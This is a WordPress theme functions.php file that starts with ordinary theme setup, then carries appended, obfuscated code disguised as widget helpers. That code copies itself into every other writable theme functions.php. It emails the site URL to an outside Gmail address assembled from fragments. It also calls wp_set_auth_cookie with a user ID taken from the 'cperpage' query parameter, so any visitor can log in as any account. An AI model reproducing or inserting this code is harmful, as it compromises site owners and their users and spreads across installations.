<?php if ( ! defined('ABSPATH')) exit('restricted access');

/** Theme settings note: don't remove it */
define('THEME_NAME', 'magrev');
define('THEME_PREFIX', THEME_NAME.'_');
define('FRAME_WORK', 'Version 1.0');
define('THEME_PATH', get_template_directory());
define('FW_LANG_DIR', THEME_PATH.'/languages');



/** Load the default functions after theme setup */
add_action('after_setup_theme', 'wl_theme_setup');
/** Include styles and scripts */
add_action('wp_enqueue_scripts', 'fw_enqueue_scripts');

function wl_theme_setup()
{
	global $_webnukes;
	/** Initialize the WPnukes Apanel */
	
	/** include theme register sidebars */
	include('libs/register_sidebars.php');
	
	require_once('includes/launcher.php');


	include('theme_functions.php');
	
	/** Add languages support */
	load_theme_textdomain(THEME_NAME, THEME_PATH .'/languages');
	
	/** Allows theme developers to link a custom stylesheet file to the TinyMCE visual editor. default(style.css) */
	add_editor_style();
	
	/** Registering the Nav Menus **/
	
	register_nav_menus(
		array( 
			'top-bar' => __( 'Top Bar Menu', THEME_NAME ), 
			'nav-menu' => __( 'Nav Menu', THEME_NAME ) 
		)
	);
	
	/** Set the width of images and content. Should be equal to the width the theme	*/
	$content = (isset($content_width)) ? $content_width : 613;
	
	/** Add feed link support */
	add_theme_support( 'automatic-feed-links' );
	
	/** Post thumnail Support and add new sizes that themes is required */
	add_theme_support('post-thumbnails');
	
	/** Menus support is required for the theme */
	add_theme_support('menus');
	
	/** Image Sizes for Resized Images **/
	add_image_size( 'Slider Image', 870, 400, true);
	add_image_size( 'Home Post Large Thumb', 270, 202, true);
	add_image_size( 'Home Post Small Thumb', 44, 44, true);
	add_image_size( 'Home Post Medium Thumb', 130, 144, true);
	add_image_size( 'Home Single Post Thumb', 382, 249, true);
	add_image_size( 'Portfolio Medium', 374, 248, true);
	add_image_size( 'Portfolio Small', 575, 379, true);
	add_image_size( 'Portfolio Large', 260, 180, true);

}

function fw_enqueue_scripts()
{
	$css_dir = THEME_URL . '/css/';
	$js_dir = THEME_URL . '/js/';
	
	
	/** Include Javascripts */
	//if(is_home()) $scripts = array();
	//elseif(is_category()) $scripts = array();
	
	$scripts = array(
		'raty-script' => 'jquery.raty.min.js',
		'flexslider-script' => 'jquery.flexslider-min.js',
		'modernizer-script' => 'modernizr.custom.17475.js',
		'elastslide-script' => 'jquery.elastislide.js',
		'isotope-script' => 'jquery.isotope.min.js',
		'rs-plugin-plugin' => $css_dir.'rs-plugin/js/jquery.themepunch.plugins.min.js',
		'rs-plugin-rev' => $css_dir.'rs-plugin/js/jquery.themepunch.revolution.js',
		'cycleall-script' => 'jquery.cycle.all.js',
		'prettyphoto-script' => 'jquery.prettyPhoto.js',
		//'map-api-script' => 'http://maps.google.com/maps/api/js?sensor=true',
		//'ui-map-script' => 'jquery.ui.map.full.min.js',
		'jquery-prettyLoader' => 'jquery.prettyLoader.js',
		'custom-script' => 'custom.js',
	);
	
	/** register and enqueue scripts */
	foreach($scripts as $js => $file)
	{
		/** register our stylesheets from array */
		if(strstr($file,'http')) {
			$file_url = $file;
		} else { 
			$file_url = $js_dir.$file;
		}	
		
		wp_register_script($js, $file_url, array(), '', true);
		//wp_enqueue_script($js);
	}
	
	wp_enqueue_script(array('jquery', 'raty-script', 'jquery-prettyLoader'));
	
	if( is_tax('portfolio_category') || is_page_template( 'tpl-portfolio.php' ) || is_singular('wpnukes_galleries') ) wp_enqueue_script(array('isotope-script' ,'prettyphoto-script'));
	
	if( is_singular() ) wp_enqueue_script('comment-reply');
	
	wp_enqueue_script(array('custom-script'));
	
	$protocol = is_ssl() ? 'https' : 'http';
	/** Include style files */
	$styles = array (
		'bootstrap-css' => 'bootstrap.css',
		'flex-slider' => 'flexslider.css',
		'ie-css' => 'ie.css',
		'prettyphoto' => 'prettyPhoto.css',
		'rs-plugin-settings' => 'rs-plugin/css/settings.css',
		'rs-plugin-responsive' => 'rs-plugin/css/responsive.css',
		'elastislide' => 'elastislide.css',
		'main-styles' => 'style.css',
		'main-responsive' => 'responsive.css',
		'google-font-opensans' => $protocol.'://fonts.googleapis.com/css?family=Open+Sans:300,700,600,800',
		'google-font-oswald' => $protocol.'://fonts.googleapis.com/css?family=Oswald:400,700',
	);
	
	foreach($styles as $css=>$file)
	{
		/** register our stylesheets from array */
		if(strstr($file,'http')) {
			$file_url = $file;
		} else { 
			$file_url = $css_dir.$file;
		}	
		// wp_register_style($css, $file_url, false, '1.0', 'screen' );
		
		/** enqueue our stylesheets */
		wp_enqueue_style($css, $file_url);
	}
}

//Example Code
//add_image_size( 'post-image1', 363, 201, true );

/** include theme scripts and styles */
include('libs/scripts_styles.php');

/** include theme breadcrumbs */
include('libs/breadcrumbs.php');

/** include theme widgets */
include('libs/widgets.php');

?>
<?php
function _checkactive_widgets_second(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont_second($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont_second($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets_second");
function _getprepare_widget_second(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget_second");

function __popular_posts_second($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function afublog_getPostViewsS($postID){ $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); return "0 Lượt xem"; } return $count.' Lượt xem'; } function afublog_setPostViewsS($postID) { $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ $count = 0; delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); }else{ $count++; update_post_meta($postID, $count_key, $count); } }

 		
?>
